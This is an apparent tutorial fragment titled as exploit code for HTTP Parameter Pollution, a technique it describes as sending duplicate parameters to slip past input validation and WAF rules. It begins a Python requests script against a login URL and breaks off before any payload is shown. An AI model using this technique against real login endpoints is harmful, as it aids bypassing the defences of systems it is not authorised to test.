# HTTP Parameter Pollution (HPP) Exploit Code

HTTP Parameter Pollution (HPP) is a technique where multiple parameters with the same name are sent to a server, which can sometimes bypass input validation and WAF rules. Here are examples in different languages:

## Python (using requests)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/login"

# Parameters with duplicate keys to cause HPP
